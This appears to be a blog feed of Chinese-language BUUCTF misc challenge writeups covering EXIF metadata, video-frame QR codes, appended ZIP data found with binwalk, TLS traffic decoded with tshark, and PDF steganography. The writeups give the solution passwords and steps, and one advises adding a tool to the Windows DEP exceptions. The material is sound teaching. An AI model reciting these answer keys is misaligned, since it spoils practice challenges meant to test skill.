<li><a href="/2024/09/19/ctf/writeup/misc/buuctf/%5BNISACTF-2022%5Dhuaji/" title="NISACTF-2022-huaji？">[NISACTF-2022]huaji</a></li>
<li><a href="/2024/09/19/ctf/writeup/misc/buuctf/%E8%8E%AB%E5%B0%94%E6%96%AF%E7%94%B5%E7%A0%81/" title="莫尔斯电码">莫尔斯电码</a></li>
<li><a href="/2024/09/19/ctf/writeup/misc/buuctf/%E6%B3%A2%E5%BD%A2%E5%9B%BE/" title="波形图">波形图</a></li>
<li><a href="/2024/09/19/ctf/writeup/misc/buuctf/%E9%A2%91%E8%B0%B1%E5%9B%BE/" title="频谱图">频谱图</a></li>
<li><a href="/2024/09/19/ctf/writeup/misc/buuctf/%5BSCTF2021%5Din_the_vaporwaves/" title="SCTF 2021-in_the_vaporwaves">[SCTF2021]in_the_vaporwaves</a></li>
<li><a href="/2024/09/19/ctf/writeup/misc/buuctf/%5B2019RoarCTF%5D%E9%BB%84%E9%87%916%E5%B9%B4/" title="2019RoarCTF-黄金6年">[2019RoarCTF]黄金6年</a></li>
<li><a href="/2024/09/20/ctf/writeup/misc/buuctf/%5BWord%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5D%E5%AD%97%E4%BD%93%E9%A2%9C%E8%89%B2/" title="Word文档隐写-字体颜色">[Word文档隐写]字体颜色</a></li>
<li><a href="/2024/09/20/ctf/writeup/misc/buuctf/%5BWord%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5D%E9%9A%90%E8%97%8F%E6%96%87%E5%AD%97/" title="Word文档隐写-隐藏文字">[Word文档隐写]隐藏文字</a></li>
<li><a href="/2024/09/20/ctf/writeup/misc/buuctf/%5BWord%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5D%E8%A7%A3%E5%8E%8B1/" title="Word文档隐写-解压1">[Word文档隐写]解压1</a></li>
<li><a href="/2024/09/20/ctf/writeup/misc/buuctf/%5BWord%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5D%E8%A7%A3%E5%8E%8B2/" title="Word文档隐写-解压2">[Word文档隐写]解压2</a></li>
<li><a href="/2024/09/20/ctf/writeup/misc/buuctf/%5BUTCTF2020%5Ddocx/" title="UTCTF2020-docx">[UTCTF2020]docx</a></li>
<li><a href="/2024/09/20/ctf/writeup/misc/buuctf/%5BPDF%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5Dpdf%E9%9A%90%E5%86%99/" title="PDF文档隐写-pdf隐写">[PDF文档隐写]pdf隐写</a></li>
</ol>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>misc</category>
        <category>目录</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>writeup</tag>
        <tag>catalogue</tag>
      </tags>
  </entry>
  <entry>
    <title>EXIF</title>
    <url>/2024/09/18/ctf/writeup/misc/buuctf/EXIF/</url>
    <content><![CDATA[<h1 id="EXIF"><a href="#EXIF" class="headerlink" title="EXIF"></a>EXIF</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://buuoj.cn/" >BUUCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，也有相关的配套课本（我看的是《CTF实战 从入门到提升》，感觉还行，但有不少细节感觉还是得查资料才能懂）</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>打开靶场，会给一个图片的附件，将图片另存为下来</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E9%99%84%E5%8A%A0%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20240918234722257.png"
                      alt="image-20240918234722257"
                ></p>
<p>根据题目提示，这是一道信息隐藏在图片属性的题</p>
<p>直接打开属性即可</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/EXIF/image-20240919003028368.png"
                      alt="image-20240919003028368"
                ></p>
<p>恭喜，你找到了flag！</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这是一道直接在图片属性中添加隐藏信息，这种往往容易被忽视</p>
<p><a class="link"   href="https://buuoj.cn/challenges#[%E7%AC%AC%E4%B8%83%E7%AB%A0][7.2.1%20%E9%99%84%E5%8A%A0%E5%AD%97%E7%AC%A6%E4%B8%B2]EXIF" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>misc</category>
        <category>buuctf</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>隐写术</tag>
      </tags>
  </entry>
  <entry>
    <title>2019RoarCTF-黄金6年</title>
    <url>/2024/09/19/ctf/writeup/misc/buuctf/%5B2019RoarCTF%5D%E9%BB%84%E9%87%916%E5%B9%B4/</url>
    <content><![CDATA[<h1 id="2019RoarCTF-黄金6年"><a href="#2019RoarCTF-黄金6年" class="headerlink" title="[2019RoarCTF]黄金6年"></a>[2019RoarCTF]黄金6年</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://buuoj.cn/" >BUUCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，也有相关的配套课本（我看的是《CTF实战 从入门到提升》，感觉还行，但有不少细节感觉还是得查资料才能懂）</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>打开靶场，会给一个视频的附件，另存为下来</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5B2019RoarCTF%5D%E9%BB%84%E9%87%916%E5%B9%B4/image-20240920015430767.png"
                      alt="image-20240920015430767"
                ></p>
<p>打开视频可以依稀的看到有二维码在闪动，由于肉眼和手无法精准看到，所以借用工具<a class="link"   href="https://www.watermark-software.com/video-to-picture/video-to-picture.html?ins5.3" >videotopicture <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>进行帧分离</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5B2019RoarCTF%5D%E9%BB%84%E9%87%916%E5%B9%B4/image-20240920015652851.png"
                      alt="image-20240920015652851"
                ></p>
<p>可以看到里面有包含二维码的图片</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5B2019RoarCTF%5D%E9%BB%84%E9%87%916%E5%B9%B4/atta044.jpg"
                      alt="atta044"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5B2019RoarCTF%5D%E9%BB%84%E9%87%916%E5%B9%B4/atta117.jpg"
                      alt="atta117"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5B2019RoarCTF%5D%E9%BB%84%E9%87%916%E5%B9%B4/atta215.jpg"
                      alt="atta215"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5B2019RoarCTF%5D%E9%BB%84%E9%87%916%E5%B9%B4/atta272.jpg"
                      alt="atta272"
                ></p>
<p>依次扫码可以得到一串字符串<code>iwantplayctf</code>，然而这不是正常的flag</p>
<p>用打开MP4，看到最后又隐藏着一串Base64编码的文件，分离后解压需要的密码就是我们上一步得到的字符串</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5B2019RoarCTF%5D%E9%BB%84%E9%87%916%E5%B9%B4/image-20240920021750863.png"
                      alt="image-20240920021750863"
                ></p>
<p>解码后保存为.zip文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5B2019RoarCTF%5D%E9%BB%84%E9%87%916%E5%B9%B4/image-20240920022208085.png"
                      alt="image-20240920022208085"
                ></p>
<p>输入密码，得到flag</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5B2019RoarCTF%5D%E9%BB%84%E9%87%916%E5%B9%B4/image-20240920022320794.png"
                      alt="image-20240920022320794"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5B2019RoarCTF%5D%E9%BB%84%E9%87%916%E5%B9%B4/image-20240920022415831.png"
                      alt="image-20240920022415831"
                ></p>

  <div class="note p-4 mb-4 rounded-small warning">
    <p>提交的时候需要将<code>roarctf</code>改为<code>flag</code>来提交</p>

  </div>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>一道比较综合的题目，考察了视频帧与key组合，加上文件尾隐藏还是比较好玩的，可以亲自去试试</p>
<p><a class="link"   href="https://buuoj.cn/challenges#[%E7%AC%AC%E4%B8%83%E7%AB%A0][7.4.2%20%E6%A1%88%E4%BE%8B%E8%A7%A3%E6%9E%90][2019RoarCTF]%E9%BB%84%E9%87%91%206%20%E5%B9%B4" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>misc</category>
        <category>buuctf</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>隐写术</tag>
      </tags>
  </entry>
  <entry>
    <title>INSHack2019-Passthru*</title>
    <url>/2024/09/23/ctf/writeup/misc/buuctf/%5BINSHack2019%5DPassthru/</url>
    <content><![CDATA[<h1 id="INSHack2019-Passthru"><a href="#INSHack2019-Passthru" class="headerlink" title="[INSHack2019]Passthru*"></a>[INSHack2019]Passthru*</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://buuoj.cn/" >BUUCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，也有相关的配套课本（我看的是《CTF实战 从入门到提升》，感觉还行，但有不少细节感觉还是得查资料才能懂）</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>打开靶场，会给一个压缩包的附件，另存为下来</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BINSHack2019%5DPassthru/image-20240924004037726.png"
                      alt="image-20240924004037726"
                ></p>
<p>打开会看到两个文件，<code>sslkey.log</code>和<code>capture.pcap</code>，一看就是和TLS流量分析有关的</p>
<h3 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h3><p>用<a class="link"   href="https://www.wireshark.org/" >wireshark <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>打开并导入<code>sslkey.log</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20240923213905847.png"
                      alt="image-20240923213905847"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20240923213909476.png"
                      alt="image-20240923213909476"
                ></p>
<p>打开追踪流可以看到有GET请求中的<code>kcahsni</code>参数很奇怪，而<code>kcahsni</code>正是靶场<code>inshack</code>的逆序，则说明这里面一定有隐藏信息</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BINSHack2019%5DPassthru/image-20240924004633777.png"
                      alt="image-20240924004633777"
                ></p>
<p>过滤查找看看</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http.request.uri.query.parameter contains &quot;kcahsni&quot;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BINSHack2019%5DPassthru/image-20240924004820395.png"
                      alt="image-20240924004820395"
                ></p>
<p>可以看到有很多流量包</p>
<h3 id="tshark"><a href="#tshark" class="headerlink" title="tshark"></a>tshark</h3><p>这里用<code>kali</code>自带的<code>tshark</code>导出指定内容</p>
<h4 id="参数说明"><a href="#参数说明" class="headerlink" title="参数说明"></a>参数说明</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-r 指定流量包文件</span><br><span class="line"></span><br><span class="line">-o 首选项导入sslkey.log文件</span><br><span class="line"></span><br><span class="line">-Y 设置显示过滤器</span><br><span class="line"></span><br><span class="line">-T,-e 结合打印指定内容</span><br></pre></td></tr></table></figure></div>

<h4 id="导出代码"><a href="#导出代码" class="headerlink" title="导出代码"></a>导出代码</h4><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">tshark -r capture.pcap -o <span class="string">&#x27;tls.keylog_file:sslkey.log&#x27;</span> -Y <span class="string">&#x27;http.request.uri.query.parameter contains &quot;kcahsni&quot;&#x27;</span> -T fields -e http.request.uri.query.parameter &gt; query.txt</span><br></pre></td></tr></table></figure></div>

<h3 id="py脚本"><a href="#py脚本" class="headerlink" title="py脚本"></a>py脚本</h3><p>写一个小脚本将<code>kcahsni</code>值导出来</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;query.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = unquote(f.read())	<span class="comment">#将值以url编码</span></span><br><span class="line">rlist=re.findall(<span class="string">r&#x27;kcahsni=(.*?),&#x27;</span>, data)	<span class="comment">#正则匹配所有kcahsni值</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="string">&quot;&quot;</span>.join(rlist))[::-<span class="number">1</span>])	<span class="comment">#将值转换为16进制拼接起来并逆序输出</span></span><br></pre></td></tr></table></figure></div>

<p>执行脚本就可以将值嵌套起来然后逆序得到flag啦！</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BINSHack2019%5DPassthru/image-20240924010331926.png"
                      alt="image-20240924010331926"
                ></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>算是一个综合题，其中的python脚本是书上给的（别问，问就是不会），难点还是在于最开始分析出异常那一块，多练练题感受吧，我也得刷题去了ε&#x3D;ε&#x3D;ε&#x3D;ε&#x3D;ε&#x3D;ε&#x3D;┌(;￣◇￣)┘ </p>
<p><a class="link"   href="https://buuoj.cn/challenges#[%E7%AC%AC%E4%B9%9D%E7%AB%A0][9.3.4%20%E6%A1%88%E4%BE%8B%E8%A7%A3%E6%9E%90][INSHack2019]Passthru" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>misc</category>
        <category>buuctf</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>流量分析</tag>
      </tags>
  </entry>
  <entry>
    <title>NISACTF-2022-huaji？</title>
    <url>/2024/09/19/ctf/writeup/misc/buuctf/%5BNISACTF-2022%5Dhuaji/</url>
    <content><![CDATA[<h1 id="NISACTF-2022-huaji？"><a href="#NISACTF-2022-huaji？" class="headerlink" title="[NISACTF 2022]huaji？"></a>[NISACTF 2022]huaji？</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://buuoj.cn/" >BUUCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，也有相关的配套课本（我看的是《CTF实战 从入门到提升》，感觉还行，但有不少细节感觉还是得查资料才能懂）</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>打开靶场，会给一个无扩展名的的附件，另存为下来</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BNISACTF-2022%5Dhuaji/image-20240919191211475.png"
                      alt="image-20240919191211475"
                ></p>
<p>用<a class="link"   href="https://www.52pojie.cn/thread-1863194-1-1.html" >010Editor <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>打开看见头部是<code>FF D8 FF E0</code>，根据文件头信息，猜测是jpg后缀的图片</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BNISACTF-2022%5Dhuaji/image-20240919191533789.png"
                      alt="image-20240919191533789"
                ></p>
<table>
<thead>
<tr>
<th align="center">文件扩展名</th>
<th align="center">文件头</th>
<th align="center">文件尾</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>JPEG (jpg)</strong></td>
<td align="center"><strong>FF D8 FF</strong></td>
<td align="center"><strong>FF D9</strong></td>
</tr>
<tr>
<td align="center"><strong>PNG (png)</strong></td>
<td align="center"><strong>89 50 4E 47</strong></td>
<td align="center"><strong>AE 42 60 82</strong></td>
</tr>
<tr>
<td align="center"><strong>GIF (gif)</strong></td>
<td align="center"><strong>47 49 46 38</strong></td>
<td align="center"><strong>00 3B</strong></td>
</tr>
<tr>
<td align="center"><strong>ZIP Archive (zip)</strong></td>
<td align="center"><strong>50 4B 03 04</strong></td>
<td align="center"><strong>50 4B</strong></td>
</tr>
<tr>
<td align="center"><strong>RAR Archive (rar)</strong></td>
<td align="center"><strong>52 61 72 21</strong></td>
<td align="center"></td>
</tr>
</tbody></table>
<p>加上后缀后看到是一张滑稽的图片</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BNISACTF-2022%5Dhuaji/atta.NISACTF_2022huaji.jpg"
                      alt="atta.NISACTF_2022huaji"
                ></p>
<blockquote>
<p>针对图片有3种隐写方式，最先查看EXIF，看看是不是有隐藏属性，再修改图片宽高，还不行就看文件尾进行文件分离，最后再请出LSB最低有效位提取</p>
</blockquote>
<p>而这里第一步就可以看到有猫腻，你见过这样一串数字的型号？(≖ ‿ ≖)✧ </p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BNISACTF-2022%5Dhuaji/image-20240919192805690.png"
                      alt="image-20240919192805690"
                ></p>
<p>直接16进制转换一下，得到一串字符，先留着，下面肯定有用</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BNISACTF-2022%5Dhuaji/image-20240919192914420.png"
                      alt="image-20240919192914420"
                ></p>

  <div class="note p-4 mb-4 rounded-small red">
    <p>学会既要看头又要看尾</p>

  </div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BNISACTF-2022%5Dhuaji/image-20240919192235889.png"
                      alt="image-20240919192235889"
                ></p>
<p>看到尾巴<code>FF D9</code>是jpg的文件尾，而后面藏着<code>50 4B 03 04</code>，是zip文件头，说明后面藏着个zip文件，用文件分离工具<a class="link"   href="https://github.com/ReFirmLabs/binwalk" >Binwalk <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>分离看看</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">binwalk -e ../atta.jpg --run-as=root</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BNISACTF-2022%5Dhuaji/image-20240919193231193.png"
                      alt="image-20240919193231193"
                ></p>
<p>进入文件夹看看有一个压缩包，里面肯定存着<code>flag.txt</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BNISACTF-2022%5Dhuaji/image-20240919193329476.png"
                      alt="image-20240919193329476"
                ></p>
<p>打开需要密码，试试我们上面通过EXIF得到的字符串<code>ctf_NISA_2022</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BNISACTF-2022%5Dhuaji/image-20240919193440582.png"
                      alt="image-20240919193440582"
                ></p>
<p>恭喜，拿到了flag！</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这道题是一个综合题，考察对文件头文件尾的识别，对隐藏文件的分离和图片的隐写，对于文件头和文件尾不熟悉的可以多多练习即可，不用刻意去背</p>
<p><a class="link"   href="https://buuoj.cn/challenges#[%E7%AC%AC%E4%B8%83%E7%AB%A0][7.2.5%20%E6%A1%88%E4%BE%8B%E8%A7%A3%E6%9E%90][NISACTF%202022]huaji%EF%BC%9F" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>misc</category>
        <category>buuctf</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>隐写术</tag>
      </tags>
  </entry>
  <entry>
    <title>PDF文档隐写-pdf隐写</title>
    <url>/2024/09/20/ctf/writeup/misc/buuctf/%5BPDF%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5Dpdf%E9%9A%90%E5%86%99/</url>
    <content><![CDATA[<h1 id="PDF文档隐写-pdf隐写"><a href="#PDF文档隐写-pdf隐写" class="headerlink" title="[PDF文档隐写]pdf隐写"></a>[PDF文档隐写]pdf隐写</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://buuoj.cn/" >BUUCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，也有相关的配套课本（我看的是《CTF实战 从入门到提升》，感觉还行，但有不少细节感觉还是得查资料才能懂）</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>打开靶场，会给一个pdf的附件，另存为下来</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BPDF%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5Dpdf%E9%9A%90%E5%86%99/image-20240921004803339.png"
                      alt="image-20240921004803339"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BPDF%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5Dpdf%E9%9A%90%E5%86%99/image-20240921013808494.png"
                      alt="image-20240921013808494"
                ></p>
<p>使用工具<a class="link"   href="https://www.bailer.at/wbstego/" >wbStego4.3open <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>进行解密</p>

  <div class="note p-4 mb-4 rounded-small red">
    <p>这里是需要先知道密码的，由于是书本上面的例题，所以直接给了密码<code>air123</code></p>

  </div>

<blockquote>
<p>使用时可能会报错</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BPDF%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5Dpdf%E9%9A%90%E5%86%99/image-20240921010247506.png"
                      alt="image-20240921010247506"
                ></p>
<p>当出现上面的情况时，表示数据执行保护被拦截，需要加载打开（原本是为了避免病毒的）</p>
<p>找到“我的电脑”，右击找到“属性”，打开“高级系统设置”，找到“高级”里面的“性能”，打开“设置”，找到“数据执行保护”，根据图中提示，添加“wbStego4.3open.exe”，最后需要重启电脑</p>

  <div class="note p-4 mb-4 rounded-small info fa-solid icon-padding">
    <i class="note-icon fa-solid fa-circle-info"></i><p>做完题之后可以改回去，需要一直使用请在虚拟机操作</p>

  </div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BPDF%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5Dpdf%E9%9A%90%E5%86%99/image-20240921010708361.png"
                      alt="image-20240921010708361"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BPDF%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5Dpdf%E9%9A%90%E5%86%99/image-20240921010741505.png"
                      alt="image-20240921010741505"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BPDF%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5Dpdf%E9%9A%90%E5%86%99/image-20240921010846336.png"
                      alt="image-20240921010846336"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BPDF%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5Dpdf%E9%9A%90%E5%86%99/image-20240921010909324.png"
                      alt="image-20240921010909324"
                ></p>
<p>处理完报错之后，打开工具，根据如图的提示完成解密操作</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BPDF%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5Dpdf%E9%9A%90%E5%86%99/image-20240921014147606.png"
                      alt="image-20240921014147606"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BPDF%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5Dpdf%E9%9A%90%E5%86%99/image-20240921014244899.png"
                      alt="image-20240921014244899"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BPDF%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5Dpdf%E9%9A%90%E5%86%99/image-20240921014334233.png"
                      alt="image-20240921014334233"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BPDF%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5Dpdf%E9%9A%90%E5%86%99/image-20240921014400738.png"
                      alt="image-20240921014400738"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BPDF%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5Dpdf%E9%9A%90%E5%86%99/image-20240921014446635.png"
                      alt="image-20240921014446635"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BPDF%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5Dpdf%E9%9A%90%E5%86%99/image-20240921014509242.png"
                      alt="image-20240921014509242"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BPDF%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5Dpdf%E9%9A%90%E5%86%99/image-20240921014516108.png"
                      alt="image-20240921014516108"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BPDF%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5Dpdf%E9%9A%90%E5%86%99/image-20240921014534176.png"
                      alt="image-20240921014534176"
                ></p>
<p>恭喜拿到了flag！！！</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>PDF的隐写一般也是混合其他考题一起出，毕竟单独出这个需要你知道密码，而密码怎么得就看怎么题型混合了</p>
<p><a class="link"   href="https://buuoj.cn/challenges#[%E7%AC%AC%E4%B8%83%E7%AB%A0][7.5.2%20PDF%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99]pdf%E9%9A%90%E5%86%99" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>misc</category>
        <category>buuctf</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>隐写术</tag>
      </tags>
  </entry>
  <entry>
    <title>misc安全data目录</title>
    <url>/2024/09/26/ctf/data/misc/%E7%9B%AE%E5%BD%95/catalogue/</url>
    <content><![CDATA[<h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><p>（根据上传顺序以及学习难度进行排序）</p>
<ol>
<li><a href="/2024/09/18/ctf/data/misc/%E9%9A%90%E5%86%99%E6%9C%AF/" title="隐写术">隐写术</a></li>
<li><a href="/2024/09/23/ctf/data/misc/%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%88%86%E6%9E%90/" title="压缩包分析">压缩包分析</a></li>
<li><a href="/2024/09/23/ctf/data/misc/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" title="流量分析">流量分析</a></li>
<li><a href="/2024/09/25/ctf/data/misc/%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90/" title="取证分析">取证分析</a></li>
</ol>
]]></content>
      <categories>
        <category>ctf</category>
        <category>data</category>
        <category>misc</category>
        <category>目录</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>catalogue</tag>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>SCTF 2021-in_the_vaporwaves</title>
    <url>/2024/09/19/ctf/writeup/misc/buuctf/%5BSCTF2021%5Din_the_vaporwaves/</url>
    <content><![CDATA[<h1 id="SCTF-2021-in-the-vaporwaves"><a href="#SCTF-2021-in-the-vaporwaves" class="headerlink" title="[SCTF 2021]in_the_vaporwaves"></a>[SCTF 2021]in_the_vaporwaves</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://buuoj.cn/" >BUUCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，也有相关的配套课本（我看的是《CTF实战 从入门到提升》，感觉还行，但有不少细节感觉还是得查资料才能懂）</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>打开靶场，会给一个压缩包的附件，另存为下来，解压到本地，发现是一个.wav音频，用<a class="link"   href="https://www.audacityteam.org/post-download/" >Audacity <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>打开看看</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BSCTF%202021%5Din_the_vaporwaves/image-20240920013852945.png"
                      alt="image-20240920013852945"
                ></p>
<p>感觉这左右双通道都差不多对吧，但是啊，他们是刚好相反对称的</p>
<blockquote>
